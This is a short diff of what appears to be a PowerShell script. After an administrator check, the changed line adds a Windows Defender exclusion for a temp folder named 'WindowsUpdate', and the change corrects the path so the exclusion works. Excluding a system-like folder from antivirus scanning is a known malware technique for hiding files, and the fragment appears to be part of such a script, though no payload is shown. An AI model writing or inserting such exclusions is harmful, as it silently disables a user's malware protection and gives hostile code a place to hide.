@@ -13,4 +13,4 @@ if (-not $isAdmin) {
     exit
 
 }
-Add-MpPreference -ExclusionPath "C:\$env:TEMP\WindowsUpdate"
+Add-MpPreference -ExclusionPath "$env:TEMP\WindowsUpdate"
